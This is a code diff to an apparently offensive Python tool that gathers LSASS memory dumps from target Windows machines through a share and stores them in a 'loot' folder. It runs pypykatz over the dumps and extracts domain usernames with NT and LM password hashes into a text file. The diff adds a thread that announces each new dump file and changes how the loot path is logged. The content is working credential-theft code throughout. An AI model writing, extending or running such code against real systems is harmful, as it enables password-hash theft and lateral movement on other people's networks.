@@ -1597,13 +1597,31 @@ def setup_share():
 
     return share_name, share_user, share_pass, payload_name, share_group
 
+def alt_exec_newfile_printer(): # im aware of the issue with getting the loop to exit at the end of the run youll just have to deal with pressing ctrl c
+    file_arr_hist = []
+    try:
+        while True:
+            file_arr = glob.glob('/var/tmp/{}/*.dmp'.format(share_name))
+            for file in file_arr:
+                file = file[file.rfind('/')+1:]
+                if file not in file_arr_hist:
+                    file_arr_hist.append(file)
+                    printnlog('{}[+]{} New DMP file {}'.format(color_BLU, color_reset, file))
+            time.sleep(3)
+
+    except KeyboardInterrupt:
+        pass
 
 def alt_exec():
-    yes = input('Press enter to exit ')
+
+
+    thread1 = threading.Thread(target=alt_exec_newfile_printer)
+    thread1.start()
+
+    yes = input('Press enter to exit \n')
 
     try:  # move the share file to the loot dir
         os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
-        printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
     except BaseException as e:
         pass
 
@@ -1612,6 +1630,8 @@ def alt_exec():
         os.system('sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt'.format(cwd, timestamp, cwd, timestamp))
         os.system('sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep'.format(cwd, timestamp, cwd, timestamp))
         os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host\|\$\|::' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))
+
+        printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, cwd, timestamp, color_reset))
 
         remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
         if remove_files.lower() == 'y':
@@ -1740,7 +1760,7 @@ def auto_drive(addresses, domain):  # really helpful so you dont have to know wh
 
                         try:
                             os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
-                            printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
+                            printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, cwd, timestamp, color_reset))
                         except BaseException as e:
                             pass
 
@@ -2202,7 +2222,6 @@ if __name__ == '__main__':
 
         time.sleep(2)
         os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
-        printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, cwd, timestamp, color_reset))
 
         # for when you're attacking a lot of targets to quickly see how many we got
         printnlog('\n{} Total Extracted LSA: {}/{}'.format(green_plus, len(fnmatch.filter(os.listdir("{}/loot/{}".format(cwd, timestamp)), '*.dmp')), len(addresses)))
@@ -2224,6 +2243,8 @@ if __name__ == '__main__':
             os.system('sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt'.format(cwd, timestamp, cwd, timestamp))
             os.system('sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep'.format(cwd, timestamp, cwd, timestamp))
             os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host\|\$\|::' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))
+
+            printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, cwd, timestamp, color_reset))
 
             remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
             if remove_files.lower() == 'y':
@@ -2313,7 +2334,7 @@ if __name__ == '__main__':
 
         try:
             os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
-            printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
+            printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, cwd, timestamp, color_reset))
         except BaseException as e:
             pass
 
